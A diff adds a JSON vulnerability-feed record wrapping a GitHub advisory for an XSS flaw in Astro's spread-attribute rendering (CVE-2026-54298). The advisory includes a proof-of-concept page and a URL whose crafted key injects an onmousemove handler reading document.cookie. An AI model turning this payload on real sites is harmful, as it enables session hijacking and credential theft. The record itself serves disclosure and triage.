@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/180200014?v=4\", \"events_url\": \"https://api.github.com/users/Texuguinho1234/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Texuguinho1234/followers\", \"following_url\": \"https://api.github.com/users/Texuguinho1234/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Texuguinho1234/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Texuguinho1234\", \"id\": 180200014, \"login\": \"Texuguinho1234\", \"node_id\": \"U_kgDOCr2iTg\", \"organizations_url\": \"https://api.github.com/users/Texuguinho1234/orgs\", \"received_events_url\": \"https://api.github.com/users/Texuguinho1234/received_events\", \"repos_url\": \"https://api.github.com/users/Texuguinho1234/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Texuguinho1234/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Texuguinho1234/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Texuguinho1234\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54298\", \"cvss\": {\"score\": 4.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"## Summary\\n\\nThe `spreadAttributes` function in Astro's server-side rendering pipeline iterates over object keys and passes them directly to `addAttribute`, which interpolates the key into the HTML output without escaping. When a developer uses the spread syntax `{...props}` on an HTML element and the object keys come from an untrusted source (API, CMS, URL parameters), an attacker can inject arbitrary HTML attributes including event handlers like `onmousemove`, `onclick`, or break out of the attribute context entirely to inject new elements.\\n\\n## Details\\n\\nThe vulnerable function is [`addAttribute`](https://github.com/withastro/astro/blob/main/packages/astro/src/runtime/server/render/util.ts#L81-L141) at `packages/astro/src/runtime/server/render/util.ts:81-141`:\\n\\n```javascript\\nexport function addAttribute(value: any, key: string, shouldEscape = true, tagName = '') {\\n    if (value == null) {\\n        return '';\\n    }\\n    \\n    return markHTMLString(` ${key}=\\\"${toAttributeString(value, shouldEscape)}\\\"`); //  key interpolated not escaped\\n}\\n```\\n\\nThis function is called from [`spreadAttributes`](https://github.com/withastro/astro/blob/main/packages/astro/src/runtime/server/index.ts#L91-L92) at `packages/astro/src/runtime/server/index.ts:91-92`:\\n\\n```javascript\\nfor (const [key, value] of Object.entries(values)) {\\n    output += addAttribute(value, key, true, _name);\\n}\\n```\\n\\nThe `toAttributeString` function escapes the attribute value, but the attribute name `key` is never validated or escaped. An attacker can craft a JSON object with a key containing \\\" characters to break out of the attribute context and inject event handlers.\\n\\nExecution flow: User controlled object keys (from API, CMS, URL params) are spread onto element via `{...props}`. The compiler generates `spreadAttributes(props)` which iterates with `Object.entries()` and calls `addAttribute(value, key)`. The key is interpolated as `` ` ${key}=\\\"${escapedValue}\\\"` ``. A malicious key breaks attribute context, resulting in XSS.\\n\\n## POC\\n\\nCreate an SSR Astro page (`src/pages/index.astro`):\\n\\n```astro\\n---\\nconst props = JSON.parse(Astro.url.searchParams.get('props') || '{}');\\n---\\n<html>\\n<body>\\n  <h1>Hello</h1>\\n  <div {...props}>Move mouse here</div>\\n</body>\\n</html>\\n```\\nEnable SSR in `astro.config.mjs` (for URL based demo):\\n\\n```javascript\\nexport default defineConfig({\\n  output: 'server'\\n});\\n```\\n\\nNote: SSR is not required for the vulnerability to exist. In static builds (default), the attack vector is compromised data sources at build time (API, CMS, database). SSR simply makes the PoC easier to demonstrate via URL parameters.\\n\\nStart the dev server and visit:\\n\\n```\\nhttp://localhost:4321/?props={\\\"x\\\\\\\" onmousemove=\\\\\\\"alert(document.cookie)\\\\\\\" y\\\":\\\"\\\"}\\n```\\n\\nURL encoded:\\n\\n```\\nhttp://localhost:4321/?props=%7B%22x%5C%22%20onmousemove%3D%5C%22alert(document.cookie)%5C%22%20y%22%3A%22%22%7D\\n```\\n\\nView the HTML source. The output contains:\\n\\n```html\\n<div x\\\" onmousemove=\\\"alert(document.cookie)\\\" y=\\\"\\\">Move mouse here</div>\\n```\\n\\nThe key `x\\\" onmousemove=\\\"alert(document.cookie)\\\" y` breaks out of the attribute context. Moving the mouse over the div executes the JavaScript.\\n\\n<img width=\\\"1919\\\" height=\\\"992\\\" alt=\\\"Captura de tela 2026-06-02 005906\\\" src=\\\"https://github.com/user-attachments/assets/ef69c12e-7edf-472e-97d1-3dfa540e61b4\\\" />\\n\\n## Impact\\n\\nAn attacker can execute arbitrary JavaScript in the context of a victim's browser session on any Astro application that spreads object props from untrusted sources onto HTML elements. This is a common pattern when integrating with external APIs or CMS systems. Exploitation enables session hijacking via cookie theft, credential theft by injecting fake login forms or keyloggers, defacement of the rendered page, and redirection to attacker controlled domains.\\n\\nThe vulnerability affects all Astro versions that support spread syntax on HTML elements and is exploitable in SSR, SSG (if build time data is compromised), and hybrid deployments.\", \"epss\": {\"percentage\": 0.0016, \"percentile\": 0.05506}, \"ghsa_id\": \"GHSA-jrpj-wcv7-9fh9\", \"github_reviewed_at\": \"2026-06-16T14:57:21Z\", \"html_url\": \"https://github.com/advisories/GHSA-jrpj-wcv7-9fh9\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jrpj-wcv7-9fh9\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54298\"}], \"nvd_published_at\": \"2026-06-22T19:17:21Z\", \"published_at\": \"2026-06-16T14:57:21Z\", \"references\": [\"https://github.com/withastro/astro/security/advisories/GHSA-jrpj-wcv7-9fh9\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-54298\", \"https://github.com/advisories/GHSA-jrpj-wcv7-9fh9\"], \"repository_advisory_url\": \"https://api.github.com/repos/withastro/astro/security-advisories/GHSA-jrpj-wcv7-9fh9\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/withastro/astro\", \"summary\": \"Astro: XSS via Unescaped Attribute Names in Spread Props\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-18T17:25:06Z\", \"url\": \"https://api.github.com/advisories/GHSA-jrpj-wcv7-9fh9\", \"vulnerabilities\": [{\"first_patched_version\": \"6.4.6\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"astro\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 6.4.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jrpj-wcv7-9fh9",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "astro: < 6.4.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54298"
+    ],
+    "cvss_score": 4.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "astro"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:54.395466Z",
+  "provenance": {
+    "content_sha256": "4023439723d3ab767fe54b76b941724d3d2c1e3399182f95bc79d74724853cda",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-16T14:57:21Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jrpj-wcv7-9fh9",
+  "status": "active",
+  "title": "Astro: XSS via Unescaped Attribute Names in Spread Props",
+  "updated_at": "2026-07-18T17:25:06Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jrpj-wcv7-9fh9"
+}
